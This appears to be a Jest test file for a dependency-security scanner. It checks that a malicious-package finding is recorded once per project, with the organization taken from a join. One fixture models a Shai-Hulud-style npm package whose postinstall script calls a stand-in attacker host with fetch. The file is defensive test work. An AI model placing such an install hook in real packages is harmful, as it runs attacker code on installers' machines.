/**
 * Maintainer-sync orchestrator tests.
 *
 * Covers the cross-tenant invariant: a single dependency present in two
 * orgs writes ONE finding row per project_dependency, each with the
 * correct organization_id derived from `projects.organization_id` JOIN.
 * Caller-supplied / dependency-table-supplied org_id is never trusted.
 */
import { runMaintainerSignalSync } from '../malicious/maintainer-sync';

interface InsertedFinding {
  project_id: string;
  organization_id: string;
  project_dependency_id: string;
  rule_id: string;
  scanner: string;
  severity: string;
  extraction_run_id: string;
}

function makeMockSupabase(opts: {
  deps: Array<{ id: string; name: string; ecosystem: string; last_seen_at: string }>;
  // Map dep.id -> array of project_dependencies (each with project + org)
  pdsByDep: Record<string, Array<{ id: string; project_id: string; version: string; organization_id: string }>>;
  // Track inserted rows
  inserted: InsertedFinding[];
}) {
  let rpcInsertCount = 0;

  const queryFns: Record<string, any> = {};

  function makeBuilder(table: string): any {
    const filters: Record<string, any> = {};
    const builder: any = {
      _table: table,
      _filters: filters,
      select: jest.fn().mockReturnThis(),
      eq: jest.fn(function (this: any, k: string, v: any) {
        filters[k] = v;
        return this;
      }),
      gt: jest.fn().mockReturnThis(),
      lt: jest.fn().mockReturnThis(),
      in: jest.fn().mockReturnThis(),
      order: jest.fn().mockReturnThis(),
      limit: jest.fn().mockReturnThis(),
      maybeSingle: jest.fn(async () => {
        if (table === 'project_dependencies') {
          // anchor lookup — return first PD's version
          const depId = filters['dependency_id'];
          const pds = opts.pdsByDep[depId] ?? [];
          if (pds.length === 0) return { data: null, error: null };
          return { data: { version: pds[0].version }, error: null };
        }
        if (table === 'package_maintainer_snapshots') {
          // baseline lookup — return null (cold start)
          return { data: null, error: null };
        }
        if (table === 'notification_events') {
          return { data: { id: 'evt-1' }, error: null };
        }
        return { data: null, error: null };
      }),
      upsert: jest.fn(function (this: any) {
        // snapshot writer: chain to .select().maybeSingle()
        return this;
      }),
      insert: jest.fn(function (this: any) {
        return this;
      }),
      then: jest.fn(async function (this: any, resolve: any) {
        if (table === 'dependencies') {
          return resolve({ data: opts.deps, error: null });
        }
        if (table === 'project_dependencies') {
          // fan-out lookup — must be the eq('version', ...) call (after eq('dependency_id', ...))
          const depId = filters['dependency_id'];
          const ver = filters['version'];
          const pds = (opts.pdsByDep[depId] ?? []).filter((pd) => pd.version === ver);
          return resolve({
            data: pds.map((pd) => ({
              id: pd.id,
              project_id: pd.project_id,
              version: pd.version,
              projects: { organization_id: pd.organization_id },
            })),
            error: null,
          });
        }
        return resolve({ data: [], error: null });
      }),
    };
    return builder;
  }

  const supabase = {
    from: jest.fn((table: string) => {
      if (!queryFns[table]) queryFns[table] = makeBuilder(table);
      else queryFns[table] = makeBuilder(table);
      return queryFns[table];
    }),
    rpc: jest.fn(async (name: string, params: any) => {
      if (name === 'insert_malicious_findings_with_recompute') {
        for (const row of params.p_findings ?? []) {
          opts.inserted.push(row);
        }
        rpcInsertCount += params.p_findings?.length ?? 0;
        return { data: params.p_findings?.length ?? 0, error: null };
      }
      return { data: null, error: null };
    }),
  };

  return { supabase, getInsertedCount: () => rpcInsertCount };
}

function makeNpmFetcher(payload: unknown): typeof fetch {
  return async () =>
    ({
      ok: true,
      status: 200,
      statusText: 'OK',
      json: async () => payload,
    } as any);
}

const SHAI_HULUD_PAYLOAD = {
  name: 'evil-pkg',
  // Brand-new package: created 5 days ago
  time: { created: new Date(Date.now() - 5 * 24 * 60 * 60 * 1000).toISOString() },
  versions: {
    '1.0.0': {
      maintainers: [{ name: 'newuser', email: 'newuser@evil.example' }],
      scripts: { postinstall: "node -e 'fetch(\"http://attacker\")'" },
      dist: { signatures: [], attestations: null },
    },
  },
};

describe('runMaintainerSignalSync — cross-org fan-out', () => {
  it('writes one finding per project_dependency, with org_id JOIN-derived (never caller-supplied)', async () => {
    const inserted: InsertedFinding[] = [];
    const { supabase } = makeMockSupabase({
      deps: [{ id: 'dep-1', name: 'evil-pkg', ecosystem: 'npm', last_seen_at: new Date().toISOString() }],
      pdsByDep: {
        'dep-1': [
          { id: 'pd-org-A', project_id: 'proj-A', version: '1.0.0', organization_id: 'org-A' },
          { id: 'pd-org-B', project_id: 'proj-B', version: '1.0.0', organization_id: 'org-B' },
        ],
      },
      inserted,
    });

    const result = await runMaintainerSignalSync(supabase as any, {
      now: new Date(),
      fetcher: makeNpmFetcher(SHAI_HULUD_PAYLOAD),
    });

    expect(result.scanned).toBe(1);
    expect(result.signals_fired).toBe(1);
    // Two findings, one per org
    expect(inserted).toHaveLength(2);
    expect(inserted[0].organization_id).toBe('org-A');
    expect(inserted[0].project_id).toBe('proj-A');
    expect(inserted[1].organization_id).toBe('org-B');
    expect(inserted[1].project_id).toBe('proj-B');
    // Both reference the same Shai-Hulud-class rule
    expect(inserted[0].rule_id).toBe('maintainer:new_account_with_install_script');
    expect(inserted[0].severity).toBe('critical');
    expect(inserted[0].scanner).toBe('maintainer');
    // Synthetic extraction_run_id has the date prefix
    expect(inserted[0].extraction_run_id).toMatch(/^maintainer-cron:\d{4}-\d{2}-\d{2}$/);
  });

  it('skips dependencies with no PD anchor (no projects use them)', async () => {
    const inserted: InsertedFinding[] = [];
    const { supabase } = makeMockSupabase({
      deps: [{ id: 'dep-orphan', name: 'unused', ecosystem: 'npm', last_seen_at: new Date().toISOString() }],
      pdsByDep: { 'dep-orphan': [] },
      inserted,
    });

    const result = await runMaintainerSignalSync(supabase as any, {
      now: new Date(),
      fetcher: makeNpmFetcher(SHAI_HULUD_PAYLOAD),
    });

    expect(result.scanned).toBe(0);
    expect(inserted).toHaveLength(0);
  });
});
